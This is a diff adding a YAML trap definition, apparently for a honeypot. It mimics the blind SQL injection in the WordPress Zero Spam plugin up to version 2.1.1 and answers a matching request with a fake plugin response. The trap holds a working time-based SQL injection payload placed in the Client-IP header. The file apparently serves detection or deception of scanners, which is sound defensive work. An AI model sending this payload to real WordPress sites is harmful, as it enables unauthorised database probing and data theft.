@@ -1,0 +1,28 @@
+id: zero-spam-sql-injection
+info:
+  name: WordPress Zero Spam <= 2.1.1 - Blind SQL Injection
+  author: theamanrawat
+  description: 'The WordPress Zero Spam WordPress plugin was affected by an Unauthenticated
+    Blind SQL Injection security vulnerability.
+
+    '
+  severity: critical
+  remediation: Fixed in version 2.2.0
+  reference:
+  - https://wpscan.com/vulnerability/44cc8d59-9b45-46b7-afaf-894e4ba62dd5
+  - https://wordpress.org/plugins/zero-spam/
+  metadata:
+    verified: true
+    max-request: 1
+  tags: wpscan,wp,wp-plugin,wordpress,zero-spam,sqli,unauth
+traps:
+- request:
+    method: GET
+    path: /
+    headers:
+      Client-IP: '''+(select(0)from(select(sleep(7)))v)+'''
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: zerospam-js
